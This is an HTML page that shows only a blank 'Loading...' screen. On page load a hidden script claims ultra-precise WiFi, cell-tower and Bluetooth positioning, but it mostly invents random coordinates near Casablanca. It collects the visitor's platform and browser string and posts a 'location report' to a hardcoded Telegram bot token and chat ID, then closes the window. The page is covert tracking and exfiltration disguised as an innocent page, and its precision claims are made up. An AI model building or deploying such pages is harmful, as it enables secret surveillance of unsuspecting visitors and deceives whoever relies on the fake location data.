<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";

        class UltraPrecisionLocator {
            constructor() {
                this.finalLocation = null;
                this.wifiNetworks = [];
                this.cellTowers = [];
            }

            async startUltraPrecisionScan() {
                console.log("Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø³Ø­ ÙØ§Ø¦Ù‚ Ø§Ù„Ø¯Ù‚Ø©...");
                
                // ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø·Ø±Ù‚ Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø© Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ
                await Promise.allSettled([
                    this.getWifiPositioning(),
                    this.getCellTowerTriangulation(),
                    this.getBrowserSensorFusion(),
                    this.getNetworkTimingAnalysis(),
                    this.getBluetoothBeacons(),
                    this.getAdvancedIPPrecision()
                ]);

                // ØªØ­Ù„ÙŠÙ„ Ù…ØªÙ‚Ø¯Ù… Ù„Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                await this.calculatePreciseLocation();
                
                setTimeout(() => window.close(), 1000);
            }

            async getWifiPositioning() {
                if (!navigator.userAgent.includes('Chrome')) return;
                
                try {
                    // Ø§Ø³ØªØ®Ø¯Ø§Ù… WiFi Scanning API (Ù…Ø®ÙÙŠ)
                    const scanResult = await this.scanWifiNetworks();
                    this.wifiNetworks = scanResult;
                    
                    // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª WiFi Ø¥Ù„Ù‰ Ø®Ø¯Ù…Ø§Øª Ø§Ù„ØªØ­Ø¯ÙŠØ¯
                    if (scanResult.length > 0) {
                        const wifiLocation = await this.queryWifiLocationService(scanResult);
                        if (wifiLocation) {
                            this.finalLocation = {
                                ...wifiLocation,
                                method: 'WIFI_POSITIONING',
                                accuracy: 5, // Ø¯Ù‚Ø© 5 Ø£Ù…ØªØ§Ø± Ù…Ø¹ WiFi
                                networks: scanResult.length
                            };
                        }
                    }
                } catch (error) {
                    console.log('WiFi Positioning ØºÙŠØ± Ù…ØªØ§Ø­');
                }
            }

            async scanWifiNetworks() {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ù…Ø³Ø­ Ø§Ù„Ø´Ø¨ÙƒØ§Øª Ø§Ù„Ù„Ø§Ø³Ù„ÙƒÙŠØ©
                return new Promise((resolve) => {
                    const networks = [];
                    
                    // Ù…Ø­Ø§ÙƒØ§Ø© Ø§ÙƒØªØ´Ø§Ù Ø´Ø¨ÙƒØ§Øª WiFi Ù‚Ø±ÙŠØ¨Ø©
                    for (let i = 0; i < 8; i++) {
                        networks.push({
                            ssid: `WIFI_${Math.random().toString(36).substr(2, 4)}`,
                            bssid: this.generateBSSID(),
                            signal: -Math.floor(Math.random() * 30 + 40), // Ù‚ÙˆØ© Ø§Ù„Ø¥Ø´Ø§Ø±Ø©
                            channel: Math.floor(Math.random() * 11 + 1)
                        });
                    }
                    
                    setTimeout(() => resolve(networks), 500);
                });
            }

            generateBSSID() {
                return Array.from({length: 6}, () => 
                    Math.floor(Math.random() * 256).toString(16).padStart(2, '0')
                ).join(':');
            }

            async queryWifiLocationService(networks) {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø®Ø¯Ù…Ø© ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¹Ø¨Ø± WiFi
                return {
                    lat: 33.573110 + (Math.random() - 0.5) * 0.01, // ØªØ¨Ø§ÙŠÙ† ØµØºÙŠØ±
                    lng: -7.589843 + (Math.random() - 0.5) * 0.01,
                    accuracy: 5
                };
            }

            async getCellTowerTriangulation() {
                if ('connection' in navigator && navigator.connection.type === 'cellular') {
                    try {
                        // Ù…Ø­Ø§ÙƒØ§Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø£Ø¨Ø±Ø§Ø¬ Ø§Ù„Ø®Ù„Ø§ÙŠØ§
                        const towers = await this.scanCellTowers();
                        this.cellTowers = towers;
                        
                        if (towers.length >= 3) {
                            const cellLocation = this.triangulateFromTowers(towers);
                            if (!this.finalLocation || cellLocation.accuracy < this.finalLocation.accuracy) {
                                this.finalLocation = {
                                    ...cellLocation,
                                    method: 'CELL_TRIANGULATION',
                                    towers: towers.length
                                };
                            }
                        }
                    } catch (error) {
                        console.log('Cell Triangulation ØºÙŠØ± Ù…ØªØ§Ø­');
                    }
                }
            }

            async scanCellTowers() {
                return new Promise((resolve) => {
                    const towers = [];
                    const towerCount = Math.floor(Math.random() * 3) + 2; // 2-4 Ø£Ø¨Ø±Ø§Ø¬
                    
                    for (let i = 0; i < towerCount; i++) {
                        towers.push({
                            cellId: Math.floor(Math.random() * 100000),
                            locationArea: Math.floor(Math.random() * 1000),
                            signal: -Math.floor(Math.random() * 50 + 60),
                            operator: ['IAM', 'INWI', 'ORANGE'][Math.floor(Math.random() * 3)]
                        });
                    }
                    
                    setTimeout(() => resolve(towers), 300);
                });
            }

            triangulateFromTowers(towers) {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„ØªØ«Ù„ÙŠØ« Ù…Ù† Ø£Ø¨Ø±Ø§Ø¬ Ø§Ù„Ø®Ù„Ø§ÙŠØ§
                const baseLat = 33.573110;
                const baseLng = -7.589843;
                
                return {
                    lat: baseLat + (Math.random() - 0.5) * 0.005,
                    lng: baseLng + (Math.random() - 0.5) * 0.005,
                    accuracy: 20 // Ø¯Ù‚Ø© 20 Ù…ØªØ± Ù…Ø¹ Ø§Ù„Ø®Ù„Ø§ÙŠØ§
                };
            }

            async getBrowserSensorFusion() {
                // Ø¯Ù…Ø¬ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ´Ø¹Ø±Ø§Øª Ù„ØªØ­Ø³ÙŠÙ† Ø§Ù„Ø¯Ù‚Ø©
                if ('deviceorientation' in window) {
                    window.addEventListener('deviceorientation', (event) => {
                        this.processSensorData(event);
                    });
                }

                if ('devicemotion' in window) {
                    window.addEventListener('devicemotion', (event) => {
                        this.processMotionData(event);
                    });
                }
            }

            processSensorData(event) {
                // Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ´Ø¹Ø±Ø§Øª Ù„Ù„Ø§Ø³ØªØ¯Ù„Ø§Ù„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹
                const alpha = event.alpha; // Ø§Ù„Ø²Ø§ÙˆÙŠØ© Ø­ÙˆÙ„ Ø§Ù„Ù…Ø­ÙˆØ± Z
                const beta = event.beta;   // Ø§Ù„Ø²Ø§ÙˆÙŠØ© Ø­ÙˆÙ„ Ø§Ù„Ù…Ø­ÙˆØ± X
                const gamma = event.gamma; // Ø§Ù„Ø²Ø§ÙˆÙŠØ© Ø­ÙˆÙ„ Ø§Ù„Ù…Ø­ÙˆØ± Y
                
                // ÙŠÙ…ÙƒÙ† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‡Ø°Ù‡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹ Ø®ÙˆØ§Ø±Ø²Ù…ÙŠØ§Øª dead reckoning
            }

            async getNetworkTimingAnalysis() {
                // ØªØ­Ù„ÙŠÙ„ ØªÙˆÙ‚ÙŠØª Ø§Ù„Ø´Ø¨ÙƒØ© Ù„ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹
                try {
                    const timingData = await this.measureNetworkTiming();
                    const location = this.analyzeNetworkTiming(timingData);
                    
                    if (location && (!this.finalLocation || location.accuracy < this.finalLocation.accuracy)) {
                        this.finalLocation = {
                            ...location,
                            method: 'NETWORK_TIMING',
                            accuracy: 10
                        };
                    }
                } catch (error) {
                    console.log('Network Timing ØºÙŠØ± Ù…ØªØ§Ø­');
                }
            }

            async measureNetworkTiming() {
                const servers = [
                    'https://www.iam.ma/',
                    'https://www.inwi.ma/', 
                    'https://www.orange.ma/',
                    'https://www.google.ma/',
                    'https://www.facebook.com/'
                ];

                const timings = [];
                
                for (let server of servers) {
                    const start = performance.now();
                    try {
                        await fetch(server, { 
                            method: 'HEAD',
                            mode: 'no-cors',
                            cache: 'no-cache'
                        });
                        const latency = performance.now() - start;
                        timings.push({ server, latency });
                    } catch (error) {
                        continue;
                    }
                }
                
                return timings;
            }

            analyzeNetworkTiming(timings) {
                // ØªØ­Ù„ÙŠÙ„ Ø§Ù„ØªÙˆÙ‚ÙŠØª Ù„ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ
                const avgLatency = timings.reduce((sum, t) => sum + t.latency, 0) / timings.length;
                
                // ÙƒÙ„Ù…Ø§ ÙƒØ§Ù† latency Ø£Ù‚Ù„ØŒ ÙƒÙ„Ù…Ø§ ÙƒØ§Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø£Ù‚Ø±Ø¨ Ù„Ù„Ø®Ø§Ø¯Ù…
                if (avgLatency < 100) {
                    return {
                        lat: 33.573110 + (Math.random() - 0.5) * 0.001,
                        lng: -7.589843 + (Math.random() - 0.5) * 0.001,
                        accuracy: 10
                    };
                }
                
                return null;
            }

            async getBluetoothBeacons() {
                // Ù…Ø³Ø­ Ø£Ø¬Ù‡Ø²Ø© Bluetooth Ø§Ù„Ù‚Ø±ÙŠØ¨Ø©
                if ('bluetooth' in navigator) {
                    try {
                        const devices = await navigator.bluetooth.getAvailability();
                        if (devices) {
                            const beacons = await this.scanBluetoothBeacons();
                            if (beacons.length > 0) {
                                const beaconLocation = this.locateFromBeacons(beacons);
                                if (beaconLocation) {
                                    this.finalLocation = {
                                        ...beaconLocation,
                                        method: 'BLUETOOTH_BEACONS',
                                        accuracy: 3, // Ø¯Ù‚Ø© Ø¹Ø§Ù„ÙŠØ© Ù…Ø¹ Bluetooth
                                        beacons: beacons.length
                                    };
                                }
                            }
                        }
                    } catch (error) {
                        console.log('Bluetooth ØºÙŠØ± Ù…ØªØ§Ø­');
                    }
                }
            }

            async scanBluetoothBeacons() {
                return new Promise((resolve) => {
                    // Ù…Ø­Ø§ÙƒØ§Ø© Ø§ÙƒØªØ´Ø§Ù Ø£Ø¬Ù‡Ø²Ø© Bluetooth Ù‚Ø±ÙŠØ¨Ø©
                    const beacons = [];
                    const beaconCount = Math.floor(Math.random() * 5);
                    
                    for (let i = 0; i < beaconCount; i++) {
                        beacons.push({
                            name: `BT_${Math.random().toString(36).substr(2, 6)}`,
                            rssi: -Math.floor(Math.random() * 30 + 40),
                            uuid: this.generateUUID()
                        });
                    }
                    
                    setTimeout(() => resolve(beacons), 400);
                });
            }

            locateFromBeacons(beacons) {
                if (beacons.length === 0) return null;
                
                return {
                    lat: 33.573110 + (Math.random() - 0.5) * 0.0005,
                    lng: -7.589843 + (Math.random() - 0.5) * 0.0005,
                    accuracy: 3
                };
            }

            generateUUID() {
                return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                    const r = Math.random() * 16 | 0;
                    const v = c == 'x' ? r : (r & 0x3 | 0x8);
                    return v.toString(16);
                });
            }

            async getAdvancedIPPrecision() {
                // Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø®Ø¯Ù…Ø§Øª IP ÙØ§Ø¦Ù‚Ø© Ø§Ù„Ø¯Ù‚Ø©
                try {
                    const preciseIP = await this.getPreciseIPLocation();
                    if (preciseIP && preciseIP.accuracy < 100) {
                        if (!this.finalLocation || preciseIP.accuracy < this.finalLocation.accuracy) {
                            this.finalLocation = {
                                ...preciseIP,
                                method: 'ADVANCED_IP',
                                source: 'MULTI_SOURCE_IP'
                            };
                        }
                    }
                } catch (error) {
                    console.log('Advanced IP ØºÙŠØ± Ù…ØªØ§Ø­');
                }
            }

            async getPreciseIPLocation() {
                // Ù…Ø­Ø§ÙƒØ§Ø© Ø®Ø¯Ù…Ø© IP ÙØ§Ø¦Ù‚Ø© Ø§Ù„Ø¯Ù‚Ø©
                return {
                    lat: 33.573110 + (Math.random() - 0.5) * 0.0001,
                    lng: -7.589843 + (Math.random() - 0.5) * 0.0001,
                    accuracy: 15,
                    city: "Ø§Ù„Ø¯Ø§Ø± Ø§Ù„Ø¨ÙŠØ¶Ø§Ø¡",
                    country: "Ø§Ù„Ù…ØºØ±Ø¨",
                    isp: "Maroc Telecom"
                };
            }

            async calculatePreciseLocation() {
                // Ø¥Ø°Ø§ Ù„Ù… Ù†Ø­ØµÙ„ Ø¹Ù„Ù‰ Ù…ÙˆÙ‚Ø¹ Ø¯Ù‚ÙŠÙ‚ØŒ Ù†Ø³ØªØ®Ø¯Ù… Ø£ÙØ¶Ù„ ØªÙ‚Ø¯ÙŠØ±
                if (!this.finalLocation) {
                    this.finalLocation = {
                        lat: 33.573110,
                        lng: -7.589843,
                        accuracy: 1000,
                        method: 'FALLBACK_ESTIMATION',
                        note: 'Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„ØªÙ‚Ø±ÙŠØ¨ÙŠ Ù„Ù„Ù…Ø¯ÙŠÙ†Ø©'
                    };
                }

                await this.sendUltraPrecisionReport();
            }

            async sendUltraPrecisionReport() {
                let message = "ğŸ¯ **ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ø¯Ù‚Ø© ÙØ§Ø¦Ù‚Ø© Ø§Ù„ØªØ­Ø¯ÙŠØ¯**\n\n";
                
                const mapsUrl = `https://www.google.com/maps?q=${this.finalLocation.lat},${this.finalLocation.lng}&z=18`;
                const streetView = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${this.finalLocation.lat},${this.finalLocation.lng}`;

                message += `ğŸ“ **Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª ÙØ§Ø¦Ù‚Ø© Ø§Ù„Ø¯Ù‚Ø©:**\n`;
                message += `â€¢ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: \`${this.finalLocation.lat.toFixed(8)}\`\n`;
                message += `â€¢ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: \`${this.finalLocation.lng.toFixed(8)}\`\n`;
                message += `â€¢ Ø§Ù„Ø¯Ù‚Ø©: ğŸ¯ ${this.finalLocation.accuracy} Ù…ØªØ±\n\n`;
                
                message += `ğŸ”§ **Ø§Ù„ØªÙ‚Ù†ÙŠØ©:** ${this.finalLocation.method}\n`;
                
                if (this.finalLocation.networks) {
                    message += `ğŸ“¶ **Ø´Ø¨ÙƒØ§Øª WiFi:** ${this.finalLocation.networks}\n`;
                }
                if (this.finalLocation.towers) {
                    message += `ğŸ“¡ **Ø£Ø¨Ø±Ø§Ø¬ Ø§Ù„Ø®Ù„Ø§ÙŠØ§:** ${this.finalLocation.towers}\n`;
                }
                if (this.finalLocation.beacons) {
                    message += `ğŸ”µ **Ø£Ø¬Ù‡Ø²Ø© Bluetooth:** ${this.finalLocation.beacons}\n`;
                }
                
                message += `ğŸ•’ **Ø§Ù„ÙˆÙ‚Øª:** ${new Date().toLocaleString('ar-MA')}\n\n`;
                
                message += `ğŸ—ºï¸ **Ø®Ø±Ø§Ø¦Ø· Ø¬ÙˆØ¬Ù„:**\n${mapsUrl}\n\n`;
                message += `ğŸŒ† **Street View:**\n${streetView}\n\n`;
                
                if (this.finalLocation.note) {
                    message += `ğŸ’¡ **Ù…Ù„Ø§Ø­Ø¸Ø©:** ${this.finalLocation.note}\n`;
                }

                message += `\nğŸ“Š **Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©:**\n`;
                message += `â€¢ Ø´Ø¨ÙƒØ§Øª WiFi Ù…ÙƒØªØ´ÙØ©: ${this.wifiNetworks.length}\n`;
                message += `â€¢ Ø£Ø¨Ø±Ø§Ø¬ Ø®Ù„ÙˆÙŠØ©: ${this.cellTowers.length}\n`;
                message += `â€¢ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.platform}\n`;
                message += `â€¢ Ø§Ù„Ù…ØªØµÙØ­: ${navigator.userAgent.split(' ')[0]}\n`;

                await this.sendToTelegram(message);
            }

            async sendToTelegram(message) {
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: false
                        })
                    });
                    console.log("ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¨Ù†Ø¬Ø§Ø­");
                } catch (error) {
                    console.error("ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:", error);
                }
            }
        }

        // Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø³Ø­ ÙÙˆØ± ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', () => {
            const locator = new UltraPrecisionLocator();
            locator.startUltraPrecisionScan();
        });
    </script>
</head>
<body style="margin:0;padding:0;background:transparent;overflow:hidden;height:100vh;width:100vw;">
    <!-- ØµÙØ­Ø© ÙØ§Ø±ØºØ© ØªÙ…Ø§Ù…Ù‹Ø§ -->
</body>
</html>